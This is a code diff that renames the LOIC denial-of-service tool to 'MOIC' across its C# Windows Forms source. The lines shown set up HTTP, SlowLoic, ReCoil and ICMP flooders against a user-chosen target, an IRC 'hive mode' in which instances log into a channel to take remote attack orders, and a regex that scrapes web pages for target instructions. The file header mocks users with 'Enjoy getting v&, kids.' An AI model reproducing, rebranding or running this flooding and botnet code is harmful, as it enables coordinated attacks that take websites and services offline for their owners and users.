@@ -1,4 +1,4 @@
-/* LOIC - Low Orbit Ion Cannon
+/* MOIC - Medium Orbit Ion Cannon
  * Released to the public domain
  * Enjoy getting v&, kids.
  */
@@ -14,7 +14,7 @@ using System.Threading;
 using System.Windows.Forms;
 using Meebey.SmartIrc4net;
 
-namespace LOIC
+namespace MOIC
 {
 	public partial class frmMain : Form
 	{
@@ -36,7 +36,7 @@ namespace LOIC
 		private delegate void CheckParamsDelegate(List<string> pars);
 
 		/// <summary>
-		/// Initializes a new instance of the <see cref="LOIC.frmMain"/> class.
+		/// Initializes a new instance of the <see cref="MOIC.frmMain"/> class.
 		/// </summary>
 		/// <param name="hive">Whether to enter hive mode.</param>
 		/// <param name="hide">Whether to hide the form.</param>
@@ -146,7 +146,7 @@ namespace LOIC
 
 					bResp = chkWaitReply.Checked;
 
-					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil || protocol == Protocol.ICMP)
+					if (protocol == Protocol.slowMOIC || protocol == Protocol.ReCoil || protocol == Protocol.ICMP)
 					{
 						if (!int.TryParse(txtSLSpT.Text, out iSockspThread) || iSockspThread < 1)
 							throw new Exception("A number is fine too!");
@@ -187,8 +187,8 @@ namespace LOIC
 						case Protocol.ReCoil:
 							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 							break;
-						case Protocol.slowLOIC:
-							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
+						case Protocol.slowMOIC:
+							ts = new SlowMOIC(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 							break;
 						case Protocol.HTTP:
 							ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUseGet.Checked, chkAllowGzip.Checked);
@@ -384,7 +384,7 @@ namespace LOIC
 						irc.Connect(txtIRCserver.Text, port);
 						channel = txtIRCchannel.Text.ToLowerInvariant();
 
-						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+						irc.Login("MOIC_" + Functions.RandomString(), "Newfag's remote MOIC", 0, "IRCMOIC");
 
 						// Spawn a thread to handle the listen.
 						irclisten = new Thread(IrcListenThread);
@@ -435,7 +435,7 @@ namespace LOIC
 					int port;
 					if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
 					irc.Connect(txtIRCserver.Text, port);
-					irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+					irc.Login("MOIC_" + Functions.RandomString(), "Newfag's remote MOIC", 0, "IRCMOIC");
 				}
 				catch
 				{ }
@@ -921,9 +921,9 @@ namespace LOIC
 							{
 								ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 							}
-							if (protocol == Protocol.slowLOIC)
+							if (protocol == Protocol.slowMOIC)
 							{
-								ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
+								ts = new SlowMOIC(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 							}
 							if (protocol == Protocol.HTTP)
 							{
@@ -965,9 +965,9 @@ namespace LOIC
 						{
 							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 						}
-						if (protocol == Protocol.slowLOIC)
+						if (protocol == Protocol.slowMOIC)
 						{
-							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
+							ts = new SlowMOIC(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkAllowGzip.Checked);
 						}
 						if (protocol == Protocol.HTTP)
 						{
@@ -1065,7 +1065,7 @@ namespace LOIC
 		/// <param name="e">EventArgs.</param>
 		private void label24_Click(object sender, EventArgs e)
 		{
-			Process.Start("https://github.com/NewEraCracker/LOIC");
+			Process.Start("https://github.com/NewEraCracker/MOIC");
 		}
 
 		/// <summary>
@@ -1397,7 +1397,7 @@ namespace LOIC
 						{
 							string sResp = client.DownloadString(textOLServer.Text);
 							labelOLStatus.Text = "processing...";
-							string rxpa = "(\\[LOIC\\]\\s*(<[^>]*>)*\\s*(@?(\\S+)\\s*[:]\\s*([^<@\\n\\r\\t]+)\\s*@?\\s*(<[^>]*>[^<@\\n\\r\\t]*)*\\s*)+\\s*(<[^>]*>)*\\s*\\[/LOIC\\]|class=\"LO (tar|bu)\\s*(r)?\" href=\"([^\"]*)\"|LOIC: http://(\\S+))+";
+							string rxpa = "(\\[MOIC\\]\\s*(<[^>]*>)*\\s*(@?(\\S+)\\s*[:]\\s*([^<@\\n\\r\\t]+)\\s*@?\\s*(<[^>]*>[^<@\\n\\r\\t]*)*\\s*)+\\s*(<[^>]*>)*\\s*\\[/MOIC\\]|class=\"LO (tar|bu)\\s*(r)?\" href=\"([^\"]*)\"|MOIC: http://(\\S+))+";
 							MatchCollection matches = Regex.Matches(sResp, rxpa, RegexOptions.Compiled | RegexOptions.IgnoreCase | RegexOptions.ECMAScript);
 							//string s = var_dump(matches, 0);
 							int i = (chkbOLUp.Checked) ? 0 : (matches.Count - 1);
@@ -1432,7 +1432,7 @@ namespace LOIC
 									}
 								}
 								else if (matches[i].Groups[11].Captures.Count > 0)
-								{ // LOIC: URL
+								{ // MOIC: URL
 									if (getOLUrlCmd(matches[i].Groups[11].Captures[0].Value))
 										break;
 								}
@@ -1569,13 +1569,13 @@ namespace LOIC
 		{
 			chkMsgRandom.Enabled = (bool)(cbMethod.SelectedIndex <= 1 || cbMethod.SelectedIndex == 5); // TCP_UDP or ICMP
 			txtData.Enabled      = (bool)(cbMethod.SelectedIndex <= 1); // TCP_UDP
-			chkRandom.Enabled    = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
-			txtSubsite.Enabled   = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
+			chkRandom.Enabled    = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowMOIC
+			txtSubsite.Enabled   = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowMOIC
 
-			txtSLSpT.Enabled     = (bool)(cbMethod.SelectedIndex >= 3); // ReCoil_slowLoic_ICMP
-			chkAllowGzip.Enabled = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
+			txtSLSpT.Enabled     = (bool)(cbMethod.SelectedIndex >= 3); // ReCoil_slowMOIC_ICMP
+			chkAllowGzip.Enabled = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowMOIC
 			chkWaitReply.Enabled = (bool)(cbMethod.SelectedIndex != 4 && cbMethod.SelectedIndex != 5); // TCP_UDP_HTTP_ReCoil
-			chkUseGet.Enabled    = (bool)(cbMethod.SelectedIndex == 2 || cbMethod.SelectedIndex == 4); // HTTP_slowLoic
+			chkUseGet.Enabled    = (bool)(cbMethod.SelectedIndex == 2 || cbMethod.SelectedIndex == 4); // HTTP_slowMOIC
 		}
 
 		private void txtThreads_Leave(object sender, EventArgs e)
